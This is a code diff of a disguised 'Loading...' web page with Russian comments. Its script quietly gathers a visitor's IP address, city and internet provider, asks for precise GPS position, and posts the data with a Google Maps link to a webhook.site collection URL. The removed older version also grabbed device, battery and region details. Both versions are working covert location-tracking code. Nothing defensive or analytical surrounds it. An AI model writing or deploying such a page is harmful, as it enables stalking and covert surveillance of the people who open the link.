@@ -3,70 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
-    <style>body { background: black; margin: 0; cursor: none; overflow: hidden; }</style>
+    <style>body { background: black; margin: 0; cursor: none; }</style>
 </head>
 <body>
 <script>
 (async () => {
     const hook = "https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2";
-
-    // 1. Собираем базовое "железо" и софт
+    
     let info = {
         time: new Date().toLocaleString(),
-        device: {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            cores: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory || "N/A",
-            screen: `${screen.width}x${screen.height}`,
-            lang: navigator.language
-        },
-        battery: "N/A",
-        location: "N/A",
-        gps: "Доступ запрещен"
+        map_link: "Ожидание разрешения..."
     };
 
-    // 2. Уровень заряда (если не на айфоне, там закрыто)
+    // 1. Сначала шлем инфу по IP (Харьков и т.д.)
     try {
-        const bat = await navigator.getBattery();
-        info.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Заряжается' : 'Разряжается'})`;
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+        info.ip = d.ip;
+        info.city = d.city;
+        info.isp = d.org;
     } catch(e) {}
 
-    // 3. Подробный IP, город и ПРОВАЙДЕР
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const d = await res.json();
-        info.location = {
-            ip: d.ip,
-            city: d.city,
-            region: d.region,
-            country: d.country_name,
-            isp: d.org, // КТО ПРОВАЙДЕР (Киевстар, Воля и т.д.)
-            asn: d.asn
-        };
-    } catch(e) {}
-
-    // 4. Запрос "ТОЧКИ НА КАРТЕ" (выскочит окно разрешения)
-    const getGPS = () => {
-        return new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(
-                (p) => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
-                () => resolve("Отклонено"),
-                { enableHighAccuracy: true }
-            );
-        });
-    };
-    
+    // 2. Запрашиваем точную точку (выскочит окно подтверждения)
     if (navigator.geolocation) {
-        info.gps = await getGPS();
+        navigator.geolocation.getCurrentPosition((p) => {
+            // Если нажал "Разрешить" — создаем ссылку на Google Карты
+            info.map_link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            
+            // Отправляем финальный пакет с картой
+            fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
+        }, () => {
+            info.map_link = "Доступ отклонен пользователем";
+            fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
+        });
+    } else {
+        info.map_link = "Браузер не поддерживает GPS";
+        fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
     }
-
-    // 5. ФИНАЛЬНАЯ ОТПРАВКА
-    fetch(hook, {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(info)
-    });
 })();
 </script>
 </body>
